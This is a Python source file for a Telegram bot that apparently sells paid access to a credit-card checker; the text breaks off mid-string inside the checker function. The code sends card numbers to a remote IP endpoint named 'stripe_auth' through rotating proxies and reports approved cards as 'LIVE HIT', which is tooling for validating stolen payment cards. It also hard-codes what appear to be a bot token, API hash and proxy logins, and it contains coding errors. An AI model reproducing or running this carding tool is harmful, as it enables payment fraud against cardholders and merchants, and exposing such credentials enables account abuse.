from telethon import TelegramClient, events
import re, asyncio, os, random, json
import aiohttp
import aiofiles
from datetime import datetime

API_ID = 37235723
API_HASH = "880a876edaf529c8493b873d47821ec2"
BOT_TOKEN = "8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0"

OWNER_ID = 7077294261

PREMIUM_FILE = "premium.json"
KEYS_FILE = "keys.json"

PROXIES = [
    "dc.oxylabs.io:8000:harshop01_6Mzjy:V=DMlz+qMinV_n85",
    "px490402.pointtoserver.com:10780:purevpn0s8732217:i67s60ep"
]

client = TelegramClient('bot', API_ID, API_HASH)

async def load_json(filename):
    try:
        if not os.path.exists(filename):
            async with aiofiles.open(filename, "w") as f:
                await f.write(json.dumps({}))
            return {}
        async with aiofiles.open(filename, "r") as f:
            content = await f.read().strip()
            return json.loads(content) if content else {}
    except:
        return {}

async def save_json(filename, data):
    async with aiofiles.open(filename, "w") as f:
        await f.write(json.dumps(data, indent=4))

async def is_premium(user_id):
    if int(user_id) == OWNER_ID:
        return True
    data = await load_json(PREMIUM_FILE)
    uid = str(user_id)
    if uid not in data:
        return False
    try:
        expiry = datetime.fromisoformat(data[uid]['expiry'])
        return datetime.now() <= expiry
    except:
        return False

async def generate_key(days: int = 30):
    import secrets
    key = "STRIPE-" + secrets.token_hex(8).upper()
    data = await load_json(KEYS_FILE)
    data[key] = {"days": days, "used": False}
    await save_json(KEYS_FILE, data)
    return key

async def redeem_key(user_id, key: str):
    data = await load_json(KEYS_FILE)
    premium = await load_json(PREMIUM_FILE)
    uid = str(user_id)
    key = key.strip().upper()
    if key not in data or data[key].get("used"):
        return "❌ Invalid or already used key!"
    days = data[key]["days"]
    expiry = datetime.now() + datetime.timedelta(days=days)
    premium[uid] = {"expiry": expiry.isoformat(), "plan": f"{days} days"}
    data[key]["used"] = True
    await save_json(KEYS_FILE, data)
    await save_json(PREMIUM_FILE, premium)
    return f"✅ Success! Premium activated for {days} days."

# ================== CHECKER ==================
async def check_card(card: str):
    current_time = datetime.now().strftime('%H:%M:%S')
    print(f"[{current_time}] CHECKING → {card}")

    try:
        proxy = random.choice(PROXIES)
        proxy_url = f"http://{proxy.split(':')[2]}:{proxy.split(':')[3]}@{proxy.split(':')[0]}:{proxy.split(':')[1]}"

        url = f"http://138.128.240.15:8009/stripe_auth?cc={card}"

        async with aiohttp.ClientSession() as session:
            async with session.get(url, proxy=proxy_url, timeout=40) as r:
                text = await r.text()
                print(f"[{current_time}] STATUS: {r.status} | RESPONSE: {text}")

                if r.status == 200 and any(x in text.lower() for x in ["approved", "success", "live", "charged"]):
                    print(f"[{current_time}] ✅ LIVE HIT!")
                    return {"status": "Approved", "response": "Charged $1"}
                else:
                    print(f"[{current_time}] ❌ DECLINED (Silent)")
                    return {"status": "Declined", "response": "Decl
